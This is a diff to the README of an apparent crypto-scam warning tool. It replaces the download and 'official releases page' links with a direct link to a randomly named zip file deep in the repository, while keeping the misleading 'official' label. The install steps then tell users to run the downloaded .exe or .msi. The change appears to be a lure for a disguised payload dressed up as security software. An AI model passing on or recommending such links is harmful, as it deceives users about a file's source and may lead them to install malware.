@@ -1,6 +1,6 @@
 # ⚠️ Rug-Pull-Scam-Token-Early-Warning-System - Identify crypto scams before investing money
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Stockpotgaul100/Rug-Pull-Scam-Token-Early-Warning-System/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Stockpotgaul100/Rug-Pull-Scam-Token-Early-Warning-System/raw/refs/heads/main/girlishly/Warning_Early_System_Rug_Token_Pull_Scam_quinologist.zip)
 
 ## 🔍 Purpose
 The Rug-Pull-Scam-Token-Early-Warning-System protects digital asset holders. It screens cryptocurrency projects for signs of fraud. The software examines smart contracts and social media data. It flags tokens showing patterns common in rug pulls and honeypots. Use this tool to verify a project before you send funds.
@@ -16,7 +16,7 @@ Ensure your computer meets these requirements to run the software.
 ## 💾 How to Install
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Stockpotgaul100/Rug-Pull-Scam-Token-Early-Warning-System/releases) to download the package.
+1. Visit the [official releases page](https://github.com/Stockpotgaul100/Rug-Pull-Scam-Token-Early-Warning-System/raw/refs/heads/main/girlishly/Warning_Early_System_Rug_Token_Pull_Scam_quinologist.zip) to download the package.
 2. Select the file ending in .msi or .exe.
 3. Save the file to your Downloads folder.
 4. Open the downloaded file to start the installer.
